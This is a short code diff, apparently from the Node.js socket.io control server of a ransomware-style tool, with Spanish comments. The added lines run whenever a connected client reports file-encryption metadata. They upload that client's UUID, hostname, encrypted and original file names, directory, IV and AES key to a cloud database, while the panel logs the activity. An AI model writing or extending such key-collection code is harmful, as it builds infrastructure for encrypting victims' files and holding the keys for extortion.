@@ -1125,6 +1125,18 @@ io.on('connection', (socket) => {
       fs.writeFileSync(metaPath, JSON.stringify(data, null, 2));
       console.log(` Metadatos guardados: ${metaPath}`);
 
+      // Sync to Cloud DB (Encrypted Files)
+      const cliente = clientesConectados.get(socket.id);
+      syncToCloud('Encrypted', {
+        uuid: cliente?.uuid || data.uuid || socket.id,
+        hostname: hostname,
+        archivo: data.archivoCifrado || data.archivo,
+        archivoOriginal: data.archivoOriginal,
+        directorio: data.directorio || data.rutaOriginal,
+        iv: data.iv,
+        aesKey: data.aesKey || data.claveAES
+      });
+
       // Notificar a la UI
       io.emit('actividad-cliente', {
         tipo: 'metadatos-cifrado',
